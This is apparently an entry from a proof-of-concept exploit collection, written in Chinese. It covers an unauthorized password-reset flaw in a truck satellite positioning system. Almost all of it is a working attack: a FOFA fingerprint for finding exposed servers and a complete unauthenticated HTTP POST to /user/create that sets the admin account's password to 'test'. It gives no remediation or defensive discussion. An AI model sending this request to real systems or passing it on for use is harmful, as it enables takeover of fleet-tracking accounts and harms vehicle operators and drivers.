## 卡车卫星定位系统create存在未授权密码重置漏洞

## fofa
```
icon_hash="1553867732"
```
![image](https://github.com/wy876/POC/assets/139549762/3ce718e2-b8cf-4316-9b47-70997ee75723)


## poc
```
POST /user/create HTTP/1.1
Host: 
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/88.0.4324.190 Safari/537.36
Content-Type: application/x-www-form-urlencoded; charset=UTF-8
Accept: application/json, text/javascript, */*; q=0.01
X-Requested-With: XMLHttpRequest
Accept-Encoding: gzip, deflate
Accept-Language: zh-CN,zh;q=0.9
Connection: close

account=admin&id=1&password=test&passwordRepeat=test&groupName=111&roleid=5&validend=&phone=&email=&chncount=36&flowType=1&oldFlowType=&flowVal=&flowAlarmVal=&oldFlowAlarmVal=&logContent=111&guid=222&token=
```
